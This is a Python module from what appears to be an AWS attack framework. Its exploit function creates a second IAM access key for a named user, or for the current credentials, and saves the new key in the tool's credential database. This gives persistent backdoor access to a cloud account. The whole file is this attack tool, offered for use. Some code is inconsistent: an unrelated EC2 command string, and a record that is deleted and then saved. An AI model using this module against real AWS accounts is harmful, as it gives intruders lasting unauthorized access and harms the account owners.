import sys

import flask_mongoengine
from termcolor import colored
from datetime import datetime
import json

from core.models import AWSCredentials

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "iam",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"USER": {
		"value": "",
		"required": "false",
        "description":"The username to add the 2nd key. If not set, the current credentials will gain a 2nd key. The user needs to have only one credential to be able to use this module."
	}
}
description = "Create a 2nd access key to a user. To do this, the user needs to have only one access key."

aws_command = "aws ec2 describe-launch-templates --region {} --profile {}"

def exploit(profile):
	user = variables['USER']['value']

	try:
		if not user == "":
			response = profile.create_access_key(
				UserName=user
			)
		else:
			response = profile.create_access_key()

		json_data = response['AccessKey']

		try:
			awscredentials = AWSCredentials.objects.get(aws_access_key=json_data['AccessKeyId'])
			awscredentials.delete()
			awscredentials.save(**json_data)

			return {'UserName': json_data}, 200

		except flask_mongoengine.DoesNotExist:
			return {'error': "Credentials do not exist"}, 404

		except:
			return {
				"error": str(sys.exc_info())
			}, 500

	except:
		return {
			"error": str(sys.exc_info())
		}, 500

